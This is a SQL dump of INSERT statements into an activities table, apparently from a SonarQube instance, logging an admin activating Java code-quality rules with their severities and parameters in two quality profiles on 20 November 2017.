INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1145, '2017-11-20 07:41:48.275', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYENzbbGRdfPp-qvc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1146, '2017-11-20 07:41:48.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEOnbbGRdfPp-qvd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1147, '2017-11-20 07:41:48.362', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEPKbbGRdfPp-qve');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1148, '2017-11-20 07:41:48.43', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEQObbGRdfPp-qvf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1149, '2017-11-20 07:41:48.468', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEQ0bbGRdfPp-qvg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1150, '2017-11-20 07:41:48.506', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYERabbGRdfPp-qvh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1151, '2017-11-20 07:41:48.547', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYESDbbGRdfPp-qvi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1152, '2017-11-20 07:41:48.582', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYESmbbGRdfPp-qvj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1153, '2017-11-20 07:41:48.611', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYETDbbGRdfPp-qvk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1154, '2017-11-20 07:41:48.638', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYETebbGRdfPp-qvl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1155, '2017-11-20 07:41:48.678', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEUGbbGRdfPp-qvm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1156, '2017-11-20 07:41:48.713', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEUpbbGRdfPp-qvn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1157, '2017-11-20 07:41:48.752', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEVQbbGRdfPp-qvo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1158, '2017-11-20 07:41:48.793', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEV5bbGRdfPp-qvp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1159, '2017-11-20 07:41:48.847', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEWvbbGRdfPp-qvq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1160, '2017-11-20 07:41:48.94', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEYMbbGRdfPp-qvr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1161, '2017-11-20 07:41:48.998', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEZGbbGRdfPp-qvs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1162, '2017-11-20 07:41:49.08', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEaYbbGRdfPp-qvt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1163, '2017-11-20 07:41:49.13', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEbKbbGRdfPp-qvu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1164, '2017-11-20 07:41:49.155', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEbjbbGRdfPp-qvv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1165, '2017-11-20 07:41:49.19', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEcGbbGRdfPp-qvw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1166, '2017-11-20 07:41:49.227', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEcrbbGRdfPp-qvx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1167, '2017-11-20 07:41:49.268', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEdUbbGRdfPp-qvy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1168, '2017-11-20 07:41:49.312', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEeAbbGRdfPp-qvz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1169, '2017-11-20 07:41:49.351', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEenbbGRdfPp-qv0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1170, '2017-11-20 07:41:49.389', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEfNbbGRdfPp-qv1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1171, '2017-11-20 07:41:49.427', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEfzbbGRdfPp-qv2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1172, '2017-11-20 07:41:49.467', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEgbbbGRdfPp-qv3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1173, '2017-11-20 07:41:49.506', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEhCbbGRdfPp-qv4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1174, '2017-11-20 07:41:49.544', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEhobbGRdfPp-qv5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1175, '2017-11-20 07:41:49.579', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEiLbbGRdfPp-qv6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1176, '2017-11-20 07:41:49.618', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEiybbGRdfPp-qv7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1177, '2017-11-20 07:41:49.656', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEjYbbGRdfPp-qv8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1178, '2017-11-20 10:14:41.906', 'admin', 'key=java-lena-qp_15-78480:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D3ybbGRdfPp-qv9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1179, '2017-11-20 10:14:41.963', 'admin', 'key=java-lena-qp_15-78480:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D4rbbGRdfPp-qv-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1180, '2017-11-20 10:14:42.004', 'admin', 'key=java-lena-qp_15-78480:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D5UbbGRdfPp-qv_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1181, '2017-11-20 10:14:42.044', 'admin', 'key=java-lena-qp_15-78480:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D58bbGRdfPp-qwA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1182, '2017-11-20 10:14:42.094', 'admin', 'key=java-lena-qp_15-78480:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D6ubbGRdfPp-qwB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1183, '2017-11-20 10:14:42.14', 'admin', 'key=java-lena-qp_15-78480:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D7cbbGRdfPp-qwC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1184, '2017-11-20 10:14:42.202', 'admin', 'key=java-lena-qp_15-78480:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D8abbGRdfPp-qwD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1185, '2017-11-20 10:14:42.262', 'admin', 'key=java-lena-qp_15-78480:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D9WbbGRdfPp-qwE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1186, '2017-11-20 10:14:42.306', 'admin', 'key=java-lena-qp_15-78480:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D-CbbGRdfPp-qwF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1187, '2017-11-20 10:14:42.347', 'admin', 'key=java-lena-qp_15-78480:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-lena-qp_15-78480;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D-rbbGRdfPp-qwG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1188, '2017-11-20 10:14:42.388', 'admin', 'key=java-lena-qp_15-78480:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D_UbbGRdfPp-qwH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1189, '2017-11-20 10:14:42.423', 'admin', 'key=java-lena-qp_15-78480:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7D_3bbGRdfPp-qwI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1190, '2017-11-20 10:14:42.46', 'admin', 'key=java-lena-qp_15-78480:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EAcbbGRdfPp-qwJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1191, '2017-11-20 10:14:42.496', 'admin', 'key=java-lena-qp_15-78480:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EBAbbGRdfPp-qwK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1192, '2017-11-20 10:14:42.528', 'admin', 'key=java-lena-qp_15-78480:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EBgbbGRdfPp-qwL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1193, '2017-11-20 10:14:42.549', 'admin', 'key=java-lena-qp_15-78480:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EB1bbGRdfPp-qwM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1194, '2017-11-20 10:14:42.572', 'admin', 'key=java-lena-qp_15-78480:squid:S00100;ruleKey=squid:S00100;profileKey=java-lena-qp_15-78480;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ECMbbGRdfPp-qwN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1195, '2017-11-20 10:14:42.608', 'admin', 'key=java-lena-qp_15-78480:squid:S00101;ruleKey=squid:S00101;profileKey=java-lena-qp_15-78480;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ECwbbGRdfPp-qwO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1196, '2017-11-20 10:14:42.64', 'admin', 'key=java-lena-qp_15-78480:squid:S00107;ruleKey=squid:S00107;profileKey=java-lena-qp_15-78480;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EDQbbGRdfPp-qwP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1197, '2017-11-20 10:14:42.669', 'admin', 'key=java-lena-qp_15-78480:squid:S00108;ruleKey=squid:S00108;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EDtbbGRdfPp-qwQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1198, '2017-11-20 10:14:42.72', 'admin', 'key=java-lena-qp_15-78480:squid:S00112;ruleKey=squid:S00112;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EEgbbGRdfPp-qwR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1199, '2017-11-20 10:14:42.765', 'admin', 'key=java-lena-qp_15-78480:squid:S00114;ruleKey=squid:S00114;profileKey=java-lena-qp_15-78480;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EFNbbGRdfPp-qwS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1200, '2017-11-20 10:14:42.819', 'admin', 'key=java-lena-qp_15-78480:squid:S00115;ruleKey=squid:S00115;profileKey=java-lena-qp_15-78480;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EGDbbGRdfPp-qwT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1201, '2017-11-20 10:14:42.87', 'admin', 'key=java-lena-qp_15-78480:squid:S00116;ruleKey=squid:S00116;profileKey=java-lena-qp_15-78480;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EG2bbGRdfPp-qwU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1202, '2017-11-20 10:14:42.902', 'admin', 'key=java-lena-qp_15-78480:squid:S00117;ruleKey=squid:S00117;profileKey=java-lena-qp_15-78480;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EHWbbGRdfPp-qwV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1203, '2017-11-20 10:14:42.936', 'admin', 'key=java-lena-qp_15-78480:squid:S00119;ruleKey=squid:S00119;profileKey=java-lena-qp_15-78480;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EH4bbGRdfPp-qwW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1204, '2017-11-20 10:14:42.976', 'admin', 'key=java-lena-qp_15-78480:squid:S00120;ruleKey=squid:S00120;profileKey=java-lena-qp_15-78480;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EIgbbGRdfPp-qwX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1205, '2017-11-20 10:14:43.024', 'admin', 'key=java-lena-qp_15-78480:squid:S106;ruleKey=squid:S106;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EJQbbGRdfPp-qwY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1206, '2017-11-20 10:14:43.056', 'admin', 'key=java-lena-qp_15-78480:squid:S1065;ruleKey=squid:S1065;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EJwbbGRdfPp-qwZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1207, '2017-11-20 10:14:43.081', 'admin', 'key=java-lena-qp_15-78480:squid:S1066;ruleKey=squid:S1066;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EKJbbGRdfPp-qwa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1208, '2017-11-20 10:14:43.119', 'admin', 'key=java-lena-qp_15-78480:squid:S1068;ruleKey=squid:S1068;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EKvbbGRdfPp-qwb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1209, '2017-11-20 10:14:43.195', 'admin', 'key=java-lena-qp_15-78480:squid:S1075;ruleKey=squid:S1075;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EL7bbGRdfPp-qwc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1210, '2017-11-20 10:14:43.246', 'admin', 'key=java-lena-qp_15-78480:squid:S1118;ruleKey=squid:S1118;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EMubbGRdfPp-qwd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1211, '2017-11-20 10:14:43.308', 'admin', 'key=java-lena-qp_15-78480:squid:S1125;ruleKey=squid:S1125;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ENsbbGRdfPp-qwe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1212, '2017-11-20 10:14:43.381', 'admin', 'key=java-lena-qp_15-78480:squid:S1126;ruleKey=squid:S1126;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EO1bbGRdfPp-qwf');
